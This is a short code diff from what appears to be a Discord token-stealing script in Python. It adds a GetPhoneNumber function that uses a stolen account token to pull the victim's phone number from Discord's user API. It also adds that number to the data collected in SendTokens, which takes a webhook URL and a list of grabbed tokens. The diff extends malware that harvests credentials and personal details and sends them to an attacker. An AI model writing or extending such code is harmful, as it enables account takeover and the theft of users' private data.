@@ -97,6 +97,15 @@ def GetEmail(token):
     email = info['email']
     return email
 
+def GetPhoneNumber(token):
+    headers = {
+        'Authorization': token,
+        'Content-Type': 'application/json'
+    }
+    info = get('https://discordapp.com/api/v6/users/@me', headers=headers).json()
+    phone_number = info['phone']
+    return phone_number
+
 def GetLocale(token):
     languages = {
         'da'    : 'Danish, Denmark',
@@ -157,6 +166,7 @@ def SendTokens(webhook_url, tokens_grabbed = None):
         username = GetUsername(token)
         user_id = GetUserId(token)
         email = GetEmail(token)
+        phone_number = GetPhoneNumber(token)
         locale = GetLocale(token)[0]
         language = GetLocale(token)[1]
         
